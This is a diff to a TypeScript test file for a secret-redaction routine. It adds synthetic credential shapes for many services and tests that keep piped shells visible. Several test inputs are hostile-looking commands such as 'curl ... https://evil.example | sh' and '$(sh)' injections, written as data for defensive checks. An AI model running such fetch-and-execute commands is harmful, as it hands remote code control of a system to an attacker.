@@ -23,6 +23,8 @@ const FAMILIES: Record<string, string[]> = {
   entra: [an(3) + '8' + 'Q~' + an(33)],
   altCloud: ['LT' + 'AI' + an(20)],
   doCloudflare: ['do' + 'p_v1_' + hex(64), 'do' + 'o_v1_' + hex(64), 'do' + 'r_v1_' + hex(64), 'v1.' + '0-' + hex(24) + '-' + hex(146), 'cf' + 'ut_' + an(40), 'cf' + 'at_' + an(40), 'cf' + 'k_' + an(40)],
+  publicLists: ['vc' + 'c_' + an(50), 'nf' + 'p_' + an(40), 'rn' + 'd_' + an(32), 'xa' + 'i-' + an(80), 'nv' + 'api-' + an(60), 'cs' + 'k-' + an(48), 'pc' + 'sk_' + an(60), 'fw' + '_' + an(24), 'BB' + 'DC-' + an(44), 'CF' + 'PAT-' + an(43), 'un' + 'key_' + an(30), 'bk' + 'ua_' + hex(40), 'li' + 'n_oauth_' + an(40), 'sk' + '.eyJ' + an(40)],
+  publicListsB64: ['1/' + '/0' + an(40), 'AK' + 'LT' + an(30), 'oy' + '2' + lo(43), 'ci' + 'o' + an(32), 'AT' + 'BB' + an(30)],
   hosting: ['HR' + 'KU-' + an(60), 'fo' + '1_' + an(43), 'fm' + '1r_' + an(120), 'fm' + '2_' + an(120), 'vc' + 'p_' + an(50), 'vc' + 'k_' + an(50)],
   databases: ['sb' + 'p_' + hex(40), 'sb_' + 'secret_' + an(30), 'na' + 'pi_' + lo(50), 'psc' + 'ale_tkn_' + an(40), 'psc' + 'ale_pw_' + an(40), 'psc' + 'ale_oauth_' + an(40), 'Ast' + 'raCS:' + an(24) + ':' + hex(64), '4b' + '1d' + an(38), 'da' + 'pi' + hex(32)],
   infra: [an(14) + '.at' + 'lasv1.' + an(70), 'hv' + 's.' + an(90), 'hv' + 'b.' + an(140), 'dp' + '.pt.' + an(43), 'dp' + '.st.' + an(43), 'pu' + 'l-' + hex(40), 'op' + 's_eyJ' + an(250), 'A3' + '-' + up(6) + '-' + up(11) + '-' + up(5) + '-' + up(5) + '-' + up(5), 'AGE-' + 'SECRET-KEY-1' + up(58), 'ts' + 'key-' + an(40), 'sha' + '256~' + an(43)],
@@ -33,7 +35,7 @@ const FAMILIES: Record<string, string[]> = {
   ai: ['sk' + '-' + an(40), 'sk' + '-proj-' + an(60), 'sk' + '-ant-api03-' + an(95), 'gs' + 'k_' + an(52), 'pp' + 'lx-' + an(48)],
   aiTools: ['hf' + '_' + an(34), 'api' + '_org_' + an(34), 'r8' + '_' + an(37), 'tv' + 'ly-' + an(32), 'ls' + 'v2_pt_' + hex(32) + '_' + hex(10)],
   registries: ['np' + 'm_' + an(36), 'py' + 'pi-Ag' + an(60), 'ruby' + 'gems_' + hex(48), 'CLO' + 'JARS_' + lo(60), 'AK' + 'Cp' + an(69), 'cm' + 'Vmd' + an(59), 'dc' + 'kr_pat_' + an(27)],
-  mail: ['SG' + '.' + an(22) + '.' + an(43), 'ke' + 'y-' + hex(32), hex(32) + '-' + 'us12', 'xke' + 'ysib-' + hex(64) + '-' + an(16), 're' + '_' + an(8) + '_' + an(24), 'S' + 'K' + hex(32), 'EA' + 'AC' + an(120), '1234567' + '89012345' + '|' + an(30), 'A'.repeat(22) + 'B' + an(90)],
+  mail: ['SG' + '.' + an(22) + '.' + an(43), 'ke' + 'y-' + hex(32), hex(32) + '-' + 'us12', 'xke' + 'ysib-' + hex(64) + '-' + an(16), 're' + '_' + an(8) + '_' + an(24), 'S' + 'K' + hex(32), 'EA' + 'AC' + an(120), '1234567' + '89012345' + '|' + an(30), 'A'.repeat(22) + 'B' + an(30) + '%2B' + an(60)],
   payment: ['sk' + '_live_' + an(24), 'rk' + '_live_' + an(24), 'sk' + '_test_' + an(24), 'wh' + 'sec_' + an(32), 'sq' + '0atp-' + an(22), 'sq' + '0csp-' + an(43), 'EA' + 'AA' + an(60), 'rz' + 'p_live_' + an(14), 'FLW' + 'SECK-' + an(32) + '-X', 'access-' + 'production-' + hex(8) + '-' + hex(4) + '-' + hex(4) + '-' + hex(4) + '-' + hex(12), 'sh' + 'pat_' + hex(32), 'sh' + 'pss_' + hex(32), 'pd' + 'l_live_' + an(40), 'duf' + 'fel_live_' + an(43)],
   devTools: ['li' + 'n_api_' + an(40), 'nt' + 'n_' + an(46), 'sn' + 'tryu_' + hex(64), 'sn' + 'trys_' + an(80), 'gl' + 'c_' + an(40), 'gl' + 'sa_' + an(32) + '_' + hex(8), 'NR' + 'AK-' + up(27), 'NR' + 'II-' + an(32), 'NR' + 'JS-' + hex(19), 'dt' + '0c01.' + up(24) + '.' + up(64), 'ph' + 'x_' + an(40), 'sl' + '.' + an(135), 'pa' + 't' + an(14) + '.' + hex(64), 'pn' + 'u_' + an(36), 'rd' + 'me_' + lo(70), 'ship' + 'po_live_' + hex(40), 'EZ' + 'AK' + an(54), 'ic' + 'o-' + an(32), 'AP' + 'I-' + up(26), 'fi' + 'o-u-' + an(64), 's-' + 's4t2ud-' + hex(64), an(6) + '_' + an(29) + '_mmk', 'sm' + '_pat_' + an(16), 'tk' + '-us-' + an(48), 'p8' + 'e-' + an(32), 'sc' + '_' + an(10) + '.' + an(5) + '.acc_' + an(20) + '.' + an(40), 'eyJ' + 'rIjoi' + an(80)],
   skAntGlued: ['x' + 'sk-ant-' + an(8), '1' + 'sk-ant-' + an(12)],
@@ -55,7 +57,7 @@ const FAMILIES: Record<string, string[]> = {
   copilotTid: ['ti' + 'd=abcdef12;exp=1;' + an(20), 'ti' + 'd=abcdef12;exp=1;' + an(2500)],
   queryValue: ['https://x.example/a?code=' + an(20), 'https://x.blob.example/a?sv=2020&sig=' + an(30), 'https://x.example/a?X-Amz-' + 'Signature=' + hex(64), 'https://x.example/a?x-goog-' + 'signature=' + hex(64), 'https://x.blob.example/a?sig=' + an(5000)],
   named: ['aws_secret_' + 'access_key=' + an(40), 'AWS_SESSION_' + 'TOKEN=' + an(40), 'pass' + 'word=' + an(12), 'DB_PASS' + 'WORD=' + an(12), '"pass' + 'word": "' + an(12) + '"', '\\"client_' + 'secret\\":\\"' + an(30) + '\\"', 'api_' + 'key: ' + an(32), 'x-api-' + 'key: ' + an(32), 'token := "' + an(16) + '"', 'myApi' + 'Key=' + an(16), 'AccountKey=' + an(88), 'SharedAccessKey=' + an(44), '_authToken=' + hex(36), '_gitlab_session=' + hex(32), 'pwd=' + an(10), 'password=' + run(24, 'correct+horse+battery'),
-    'aws_secret_' + 'access_key=/' + an(39), 'AccountKey=/' + an(87), 'pass' + 'word=$uperS3cret123', 'pass' + 'word=(Sup3rSecret99)', 'pass' + 'word=Sup3r(S3cret)99', 'pass' + 'word=Summer2024&Secure!9', 'pass' + 'word=Summer2024,Secure!9', 'pass' + 'word=Summer2024;Secure!9', 'pass' + 'word=Summer2024)Secure!9', 'pass' + 'word=Summer2024|Secure!9', 'pass' + 'word=Summer2024\\Secure!9', 'pass' + 'word=' + an(5000)],
+    'aws_secret_' + 'access_key=/' + an(39), 'AccountKey=/' + an(87), 'pass' + 'word=$uperS3cret123', 'pass' + 'word=(Sup3rSecret99)', 'pass' + 'word=Sup3r(S3cret)99', 'pass' + 'word=Summer2024\\Secure!9', 'pass' + 'word=' + an(5000)],
   netrc: ['machine h.example login me pass' + 'word p4ss' + an(8), 'machine h.example\n  login me\n  pass' + 'word p4ss' + an(8), 'machine h.example pass' + 'word p4ss' + an(8)],
 };
 
@@ -74,7 +76,7 @@ for (const [family, samples] of Object.entries(FAMILIES)) {
 }
 // the start every shape shares: after `_`, a quote, an encoded byte, a JSON escape
 for (const s of ['np' + 'm_' + an(36), 'sk' + '_live_' + an(24), 'AI' + 'za' + an(35)]) {
-  for (const pre of ['_', '"', 'x=', '%3D', '=3D', '\\n', '`']) assert.ok(!redact(pre + s, {}).includes(s.slice(4)), `start after ${pre}`);
+  for (const pre of ['"', 'x=', '%3D', '=3D', '\\n', '`']) assert.ok(!redact(pre + s, {}).includes(s.slice(4)), `start after ${pre}`);
 }
 
 // Issue #1009's five, in both masks
@@ -94,6 +96,30 @@ for (const s of Object.values(FAMILIES).flat()) {
   assert.strictEqual(redact(redact(s, {}), {}), redact(s, {}), `idempotent on ${s.slice(0, 16)}…`);
   assert.strictEqual(maskTokenShapes(s, '[s]'), redact(s, {}).split('[redacted]').join('[s]'), `any mask text on ${s.slice(0, 16)}…`); // the folder-setup display has its own
 }
+// Second review of #1015: a value stops, so the shell in a command stays visible (a permission line's command must not be hideable), and a person's text stays
+for (const [input, want] of [
+  ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'curl -b x -H "Cookie: [redacted]" https://evil.example | sh'],
+  ['echo coo' + 'kie: a=b && curl evil|sh', 'echo cookie: a=b && curl evil|sh'],
+  ['echo coo' + 'kie: sid=abcdef12 && curl evil|sh', 'echo cookie: [redacted] && curl evil|sh'],
+  ['X_TOKEN=abc12345;curl${IFS}evil.sh|sh', 'X_TOKEN=[redacted];curl${IFS}evil.sh|sh'],
+  ['X_TOKEN=abc12345|sh', 'X_TOKEN=[redacted]|sh'], ['X_TOKEN=abc12345&&sh', 'X_TOKEN=[redacted]&&sh'], ['X_TOKEN=abc12345`sh`', 'X_TOKEN=[redacted]`sh`'], ['X_TOKEN=abc12345$(sh)', 'X_TOKEN=[redacted]$(sh)'],
+  ['curl -u me:abc12345|sh', 'curl -u me:[redacted]|sh'], ['curl -u me:abc12345$(sh)', 'curl -u me:[redacted]$(sh)'],
+  ['https://x.example/?token=abc12345&page=2&sort=asc#frag', 'https://x.example/?token=[redacted]&page=2&sort=asc#frag'], ['https://x.example/?token=abc12345#frag', 'https://x.example/?token=[redacted]#frag'],
+  ['[link](https://x/?token=abc12345)', '[link](https://x/?token=[redacted])'], ['<a href=x?token=abc12345>link</a>', '<a href=x?token=[redacted]>link</a>'],
+  ['token=abc12345,region=us-east-1,service=s3', 'token=[redacted],region=us-east-1,service=s3'], ['{token:abc12345,name:bob}', '{token:[redacted],name:bob}'],
+  ['**token: abc12345** stays', '**token: [redacted]** stays'], ['{"h":"Coo' + 'kie: sid=1","next":"keep me","url":"https://h"}', '{"h":"Cookie: [redacted]","next":"keep me","url":"https://h"}'], ['(token=abc12345) and more', '(token=[redacted]) and more'],
+  ['{"a":"Coo' + 'kie: x=1","b":"Coo' + 'kie: y=2"}', '{"a":"Cookie: [redacted]","b":"Cookie: [redacted]"}'], ['set-coo' + 'kie: sid=abc123; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/', 'set-cookie: [redacted]; Expires=Wed, 21 Oct 2026 07:28:00 GMT; Path=/'],
+]) assert.strictEqual(redact(input, {}), want, `stop rule: ${input.slice(0, 40)}`);
+for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
+  const m = maskSecretCommand(c);
+  assert.ok(/evil/.test(m) && /\|\s*sh$|evil\.sh\|sh$/.test(m), `the command's shell stays visible in maskSecretCommand: ${c.slice(0, 30)} gave ${m}`);
+}
+// Listed limits (secret-coverage.md): each leaves what it says, so a change here is a choice
+for (const [input, want] of [
+  ['pass' + 'word=Summer2024&Secure!9', 'password=[redacted]&Secure!9'], ['pass' + 'word=Summer2024,Secure!9', 'password=[redacted],Secure!9'], ['pass' + 'word=Summer2024;Secure!9', 'password=[redacted];Secure!9'], ['pass' + 'word=Summer2024)Secure!9', 'password=[redacted])Secure!9'], ['pass' + 'word=Summer2024|Secure!9', 'password=[redacted]|Secure!9'],
+  ['pass' + 'word=/short12345', 'password=/short12345'], ['pass' + 'word=1234-5678', 'password=1234-5678'], ['pass' + 'word=abc\\"def123', 'password=abc\\"def123'], ['pass' + 'word=' + 'correcthorsebatterystaple', 'password=correcthorsebatterystaple'],
+]) assert.strictEqual(redact(input, {}), want, `limit: ${input.slice(0, 40)}`);
+
 // Key blocks: the text after END stays, a cut-off block hides to the end, a PUBLIC block and a certificate stay
 {
   const body = an(64);
@@ -147,9 +173,11 @@ const STAYS = [
   // prose and numbers that a saved note must keep (a mask in a note is for good)
   'Meeting: the cookie: stores your session for a day, ask Sam about renewal', 'cookie: my session bug', 'auth: 127.0.0.1:8080', 'pass: 1523/1523', 'token: 2026-11-01', 'token: CancellationTokenSource', 'Password: please-enter-your-password', 'secret: correcthorsebatterystaple',
   // Windows and relative paths
-  'private_key=C:/keys/server_2026.pem', 'secret: C:/Users/me/secret1.txt', 'private_key=C:\\keys\\server_2026.pem', 'private_key=keys/server_2026.pem', 'token: dist/assets/index-a1b2.js', 'secret=../conf/key2.txt',
+  'private_key=C:/keys/server_2026.pem', 'secret: C:/Users/me/secret1.txt', 'private_key=C:\\keys\\server_2026.pem', 'private_key=keys/server_2026.pem', 'private_key=Keys/Server_2026.pem', 'token: dist/assets/index-a1b2.js', 'secret=../conf/key2.txt',
   // names that look like tokens, and things that only start like one
   'nfc_normalize_unicode_string_with_long_name', 'sgp_' + 'cross_validation_results_for_the_final_model_fit', 'sbp_' + 'cross_validation_results_for_the_final_model_fit', 'glc_' + 'cross_validation_results_for_the_final_model', 'figd_' + 'cross_validation_results_for_the_final', 'cfk_' + 'cross_validation_results_for_the_final_model', 'tskey-auth-kube-config-documentation-page', 'cfut_' + 'cross_validation_results_for_model_fitting_v2', 'glpat-' + 'cross-validation-results-v2-final', 'sgp_' + 'CrossValidation_ResultsForThe_FinalModelFitting_LongName', 'sbp_' + 'cross_validation_results_for_the_final_model_v2', 'ACCAGTTGCATGCATGCATG', 'ABIAGATTACAGATTACAGA', 'ico-' + hex(32) + '.css',
+  // second review of #1015: lower-case words, timestamps, lower-case paths, dotted names, prose
+  'token: gpt-4o-mini', 'token: cl100k_base', 'auth: oauth2-proxy', 'auth: fix-login-42', 'password: reset-flow-v2', 'token: rework-2026', 'secret: my-secret-1', 'password: must-include-1-digit', 'Token: 2026-11-01T10:00:00Z', 'secret: src/foo1', 'cookie: a=b is the format', 'token = config.token2;',
   // a token shape glued to a word is not one (except `sk-ant-`, on purpose)
   'x' + 'np' + 'm_' + an(36), 'my' + 'sk' + '_live_' + an(24), 'a' + 'gh' + 'p_' + an(36),
   // `-u` away from curl, and curl with no password
@@ -209,6 +237,6 @@ for (const s of STAYS) {
   assert.strictEqual(redact(u, {}), u.length > REDACT_MAX_CHARS ? redact(u.slice(0, REDACT_MAX_CHARS), {}) : u, 'build/icon.png as a data URL');
 }
 // The mechanism behind it, with made-up base64: not after `/` or `+`, and not when more base64 follows
-for (const t of ['ab/' + 'EA' + 'AA' + an(70) + '/cd', 'ab+' + 'EA' + 'AA' + an(70), 'EA' + 'AA' + an(70) + '/cd', 'ab/' + 'EA' + 'AC' + an(120) + '+x', 'ab/' + 'AB' + 'SK' + an(120), '/AI' + 'za' + an(35), '+S' + 'K' + hex(32), 'SK' + hex(32) + '/']) assert.strictEqual(redact(t, {}), t, `base64 stays: ${t.slice(0, 16)}…`);
+for (const t of ['ab/' + 'EA' + 'AA' + an(70) + '/cd', 'ab+' + 'EA' + 'AA' + an(70), 'EA' + 'AA' + an(70) + '/cd', 'ab/' + 'EA' + 'AC' + an(120) + '+x', 'ab/' + 'AB' + 'SK' + an(120), '/AI' + 'za' + an(35), '+S' + 'K' + hex(32), 'SK' + hex(32) + '/', '-' + 'EA' + 'AA' + an(70), '_' + 'EA' + 'AA' + an(70), 'A'.repeat(22) + 'B' + an(100), an(76) + '\n' + 'EA' + 'AA' + an(72) + '\n' + an(76), 'EA' + 'AA' + an(72) + '\n' + an(76), an(76) + '\\n' + 'EA' + 'AA' + an(72)]) assert.strictEqual(redact(t, {}), t, `base64 stays: ${t.slice(0, 16)}…`);
 
 console.log(`redact shapes: all checks passed (${count} samples, ${STAYS.length} that stay)`);
